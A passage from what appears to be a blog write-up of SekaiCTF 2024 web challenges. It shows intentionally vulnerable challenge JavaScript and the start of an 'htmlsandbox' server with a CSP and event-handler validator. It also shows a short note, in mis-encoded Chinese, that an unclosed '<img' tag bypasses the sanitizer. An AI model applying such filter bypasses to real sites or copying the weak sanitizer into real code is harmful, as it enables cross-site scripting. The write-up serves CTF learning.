punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> str<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">autoDisplay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> urlParams <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> input <span class="token operator">=</span> urlParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'auto_input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">displayInput</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">displayInput</span><span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> urlParams <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> fulldisplay <span class="token operator">=</span> urlParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'fulldisplay'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> sanitizedInput <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        sanitizedInput <span class="token operator">=</span> <span class="token function">sanitizeInput</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> userInput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"userInput"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>        sanitizedInput <span class="token operator">=</span> <span class="token function">sanitizeInput</span><span class="token punctuation">(</span>userInput<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">var</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"displayFrame"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> iframeContent <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        &lt;!DOCTYPE html>        &lt;head>            &lt;title>Display&lt;/title>            &lt;link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet">            &lt;style>                body &#123;                    font-family: 'Press Start 2P', cursive;                    color: #212529;                     padding: 10px;                 &#125;            &lt;/style>        &lt;/head>        &lt;body>            </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>sanitizedInput<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">        &lt;/body>    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'text/html'</span><span class="token punctuation">,</span> <span class="token string">'replace'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>iframeContent<span class="token punctuation">)</span><span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fulldisplay <span class="token operator">&amp;&amp;</span> sanitizedInput<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> tab <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>        tab<span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>iframe<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">autoDisplay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>sanitizeInput</code>è¿™é‡Œè¿‡æ»¤äº†html tagï¼Œä¸è¿‡å¯ä»¥ç”¨ <code>&lt;img src=1.jpg;</code> è¿™æ ·çš„æ–¹å¼æ¥æ’å…¥ä¸€ä¸ªhtmlæ ‡ç­¾ï¼Œè™½ç„¶åªèƒ½æ’å…¥ä¸€ä¸ª</p><p><img src="/blog/2024/08/31/SekaiCTF2024%E5%A4%8D%E7%8E%B0/image-20240831105446898.png" alt="image-20240831105446898"></p><p>æ„Ÿè§‰æ²¡å•¥ç”¨ï¼Œéšä¾¿è®°ä¸€ä¸‹</p><hr><h1 id="htmlsandboxï¼ˆUnsolvedï¼‰"><a href="#htmlsandboxï¼ˆUnsolvedï¼‰" class="headerlink" title="htmlsandboxï¼ˆUnsolvedï¼‰"></a>htmlsandboxï¼ˆUnsolvedï¼‰</h1><p>server.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> puppeteer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'puppeteer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> redis <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'redis'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node:crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node:path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">EVENTS</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"onsearch"</span><span class="token punctuation">,</span><span class="token string">"onappinstalled"</span><span class="token punctuation">,</span><span class="token string">"onbeforeinstallprompt"</span><span class="token punctuation">,</span><span class="token string">"onbeforexrselect"</span><span class="token punctuation">,</span><span class="token string">"onabort"</span><span class="token punctuation">,</span><span class="token string">"onbeforeinput"</span><span class="token punctuation">,</span><span class="token string">"onbeforematch"</span><span class="token punctuation">,</span><span class="token string">"onbeforetoggle"</span><span class="token punctuation">,</span><span class="token string">"onblur"</span><span class="token punctuation">,</span><span class="token string">"oncancel"</span><span class="token punctuation">,</span><span class="token string">"oncanplay"</span><span class="token punctuation">,</span><span class="token string">"oncanplaythrough"</span><span class="token punctuation">,</span><span class="token string">"onchange"</span><span class="token punctuation">,</span><span class="token string">"onclick"</span><span class="token punctuation">,</span><span class="token string">"onclose"</span><span class="token punctuation">,</span><span class="token string">"oncontentvisibilityautostatechange"</span><span class="token punctuation">,</span><span class="token string">"oncontextlost"</span><span class="token punctuation">,</span><span class="token string">"oncontextmenu"</span><span class="token punctuation">,</span><span class="token string">"oncontextrestored"</span><span class="token punctuation">,</span><span class="token string">"oncuechange"</span><span class="token punctuation">,</span><span class="token string">"ondblclick"</span><span class="token punctuation">,</span><span class="token string">"ondrag"</span><span class="token punctuation">,</span><span class="token string">"ondragend"</span><span class="token punctuation">,</span><span class="token string">"ondragenter"</span><span class="token punctuation">,</span><span class="token string">"ondragleave"</span><span class="token punctuation">,</span><span class="token string">"ondragover"</span><span class="token punctuation">,</span><span class="token string">"ondragstart"</span><span class="token punctuation">,</span><span class="token string">"ondrop"</span><span class="token punctuation">,</span><span class="token string">"ondurationchange"</span><span class="token punctuation">,</span><span class="token string">"onemptied"</span><span class="token punctuation">,</span><span class="token string">"onended"</span><span class="token punctuation">,</span><span class="token string">"onerror"</span><span class="token punctuation">,</span><span class="token string">"onfocus"</span><span class="token punctuation">,</span><span class="token string">"onformdata"</span><span class="token punctuation">,</span><span class="token string">"oninput"</span><span class="token punctuation">,</span><span class="token string">"oninvalid"</span><span class="token punctuation">,</span><span class="token string">"onkeydown"</span><span class="token punctuation">,</span><span class="token string">"onkeypress"</span><span class="token punctuation">,</span><span class="token string">"onkeyup"</span><span class="token punctuation">,</span><span class="token string">"onload"</span><span class="token punctuation">,</span><span class="token string">"onloadeddata"</span><span class="token punctuation">,</span><span class="token string">"onloadedmetadata"</span><span class="token punctuation">,</span><span class="token string">"onloadstart"</span><span class="token punctuation">,</span><span class="token string">"onmousedown"</span><span class="token punctuation">,</span><span class="token string">"onmouseenter"</span><span class="token punctuation">,</span><span class="token string">"onmouseleave"</span><span class="token punctuation">,</span><span class="token string">"onmousemove"</span><span class="token punctuation">,</span><span class="token string">"onmouseout"</span><span class="token punctuation">,</span><span class="token string">"onmouseover"</span><span class="token punctuation">,</span><span class="token string">"onmouseup"</span><span class="token punctuation">,</span><span class="token string">"onmousewheel"</span><span class="token punctuation">,</span><span class="token string">"onpause"</span><span class="token punctuation">,</span><span class="token string">"onplay"</span><span class="token punctuation">,</span><span class="token string">"onplaying"</span><span class="token punctuation">,</span><span class="token string">"onprogress"</span><span class="token punctuation">,</span><span class="token string">"onratechange"</span><span class="token punctuation">,</span><span class="token string">"onreset"</span><span class="token punctuation">,</span><span class="token string">"onresize"</span><span class="token punctuation">,</span><span class="token string">"onscroll"</span><span class="token punctuation">,</span><span class="token string">"onsecuritypolicyviolation"</span><span class="token punctuation">,</span><span class="token string">"onseeked"</span><span class="token punctuation">,</span><span class="token string">"onseeking"</span><span class="token punctuation">,</span><span class="token string">"onselect"</span><span class="token punctuation">,</span><span class="token string">"onslotchange"</span><span class="token punctuation">,</span><span class="token string">"onstalled"</span><span class="token punctuation">,</span><span class="token string">"onsubmit"</span><span class="token punctuation">,</span><span class="token string">"onsuspend"</span><span class="token punctuation">,</span><span class="token string">"ontimeupdate"</span><span class="token punctuation">,</span><span class="token string">"ontoggle"</span><span class="token punctuation">,</span><span class="token string">"onvolumechange"</span><span class="token punctuation">,</span><span class="token string">"onwaiting"</span><span class="token punctuation">,</span><span class="token string">"onwebkitanimationend"</span><span class="token punctuation">,</span><span class="token string">"onwebkitanimationiteration"</span><span class="token punctuation">,</span><span class="token string">"onwebkitanimationstart"</span><span class="token punctuation">,</span><span class="token string">"onwebkittransitionend"</span><span class="token punctuation">,</span><span class="token string">"onwheel"</span><span class="token punctuation">,</span><span class="token string">"onauxclick"</span><span class="token punctuation">,</span><span class="token string">"ongotpointercapture"</span><span class="token punctuation">,</span><span class="token string">"onlostpointercapture"</span><span class="token punctuation">,</span><span class="token string">"onpointerdown"</span><span class="token punctuation">,</span><span class="token string">"onpointermove"</span><span class="token punctuation">,</span><span class="token string">"onpointerrawupdate"</span><span class="token punctuation">,</span><span class="token string">"onpointerup"</span><span class="token punctuation">,</span><span class="token string">"onpointercancel"</span><span class="token punctuation">,</span><span class="token string">"onpointerover"</span><span class="token punctuation">,</span><span class="token string">"onpointerout"</span><span class="token punctuation">,</span><span class="token string">"onpointerenter"</span><span class="token punctuation">,</span><span class="token string">"onpointerleave"</span><span class="token punctuation">,</span><span class="token string">"onselectstart"</span><span class="token punctuation">,</span><span class="token string">"onselectionchange"</span><span class="token punctuation">,</span><span class="token string">"onanimationend"</span><span class="token punctuation">,</span><span class="token string">"onanimationiteration"</span><span class="token punctuation">,</span><span class="token string">"onanimationstart"</span><span class="token punctuation">,</span><span class="token string">"ontransitionrun"</span><span class="token punctuation">,</span><span class="token string">"ontransitionstart"</span><span class="token punctuation">,</span><span class="token string">"ontransitionend"</span><span class="token punctuation">,</span><span class="token string">"ontransitioncancel"</span><span class="token punctuation">,</span><span class="token string">"onafterprint"</span><span class="token punctuation">,</span><span class="token string">"onbeforeprint"</span><span class="token punctuation">,</span><span class="token string">"onbeforeunload"</span><span class="token punctuation">,</span><span class="token string">"onhashchange"</span><span class="token punctuation">,</span><span class="token string">"onlanguagechange"</span><span class="token punctuation">,</span><span class="token string">"onmessage"</span><span class="token punctuation">,</span><span class="token string">"onmessageerror"</span><span class="token punctuation">,</span><span class="token string">"onoffline"</span><span class="token punctuation">,</span><span class="token string">"ononline"</span><span class="token punctuation">,</span><span class="token string">"onpagehide"</span><span class="token punctuation">,</span><span class="token string">"onpageshow"</span><span class="token punctuation">,</span><span class="token string">"onpopstate"</span><span class="token punctuation">,</span><span class="token string">"onrejectionhandled"</span><span class="token punctuation">,</span><span class="token string">"onstorage"</span><span class="token punctuation">,</span><span class="token string">"onunhandledrejection"</span><span class="token punctuation">,</span><span class="token string">"onunload"</span><span class="token punctuation">,</span><span class="token string">"onpageswap"</span><span class="token punctuation">,</span><span class="token string">"onpagereveal"</span><span class="token punctuation">,</span><span class="token string">"onoverscroll"</span><span class="token punctuation">,</span><span class="token string">"onscrollend"</span><span class="token punctuation">,</span><span class="token string">"onscrollsnapchange"</span><span class="token punctuation">,</span><span class="token string">"onscrollsnapchanging"</span><span class="token punctuation">,</span><span class="token string">"ontimezonechange"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">EVENT_SELECTOR</span> <span class="token operator">=</span> <span class="token constant">EVENTS</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token operator">=></span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">*[</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>e<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">]</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> client<span class="token punctuation">;</span><span class="token keyword">let</span> browser<span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">headless</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token literal-property property">pipe</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token comment">//dumpio: true,</span>        <span class="token literal-property property">args</span><span class="token operator">:</span> <span class="token punctuation">[</span>            <span class="token string">'--incognito'</span><span class="token punctuation">,</span>            <span class="token string">"--no-sandbox"</span><span class="token punctuation">,</span>            <span class="token string">"--disable-setuid-sandbox"</span><span class="token punctuation">,</span>            <span class="token string">"--js-flags=--noexpose_wasm,--jitless"</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'init browser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    client <span class="token operator">=</span> <span class="token keyword">await</span> redis<span class="token punctuation">.</span><span class="token function">createClient</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">redis://default@</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">REDIS_HOST</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">REDIS_PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token parameter">err</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Redis Client Error'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'redis connected'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> valid <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> context<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        context <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">createBrowserContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> context<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        page<span class="token punctuation">.</span><span class="token function">setDefaultTimeout</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// no shenanigans!</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// disallow making any requests</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setRequestInterception</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> reqCount <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        page<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token parameter">interceptedRequest</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            reqCount<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>interceptedRequest<span class="token punctuation">.</span><span class="token function">isInterceptResolutionHandled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>reqCount <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                interceptedRequest<span class="token punctuation">.</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span>                interceptedRequest<span class="token punctuation">.</span><span class="token function">continue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">visiting </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">...</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">3000</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">'domcontentloaded'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        valid <span class="token operator">=</span> <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token comment">// check CSP tag is at the start</span>            <span class="token comment">// check no script tags or frames</span>            <span class="token comment">// check no event handlers</span>            <span class="token keyword">return</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'head'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>firstElementChild<span class="token punctuation">.</span>outerHTML <span class="token operator">===</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;meta http-equiv="Content-Security-Policy" content="default-src 'none'"></span><span class="token template-punctuation string">`</span></span>                <span class="token operator">&amp;&amp;</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'script, noscript, frame, iframe, object, embed'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token keyword">null</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token constant">EVENT_SELECTOR</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> reqCount <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>context<span class="token punctuation">)</span> <span class="token keyword">await</span> context<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> valid<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Setup Express</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token number">3000</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> html <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>html<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>html<span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'No html.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    html <span class="token operator">=</span> html<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>html<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'&lt;html>'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid html.'</span><span class="token punctuation">)</span>    <span class="token comment">// fast sanity check</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>html<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'&lt;meta http-equiv="Content-Security-Policy" content="default-src \'none\'">'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'No CSP.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    html <span class="token operator">=</span> <span class="token function">btoa</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// check again, more strictly...</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">await</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token string">'data:text/html;base64,'</span> <span class="token operator">+</span> html<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Failed validation.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> id <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> client<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> html<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token constant">EX</span><span class="token operator">:</span> <span class="token number">300</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;a href="/upload/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">File uploaded!&lt;/a></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/upload/:id'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> 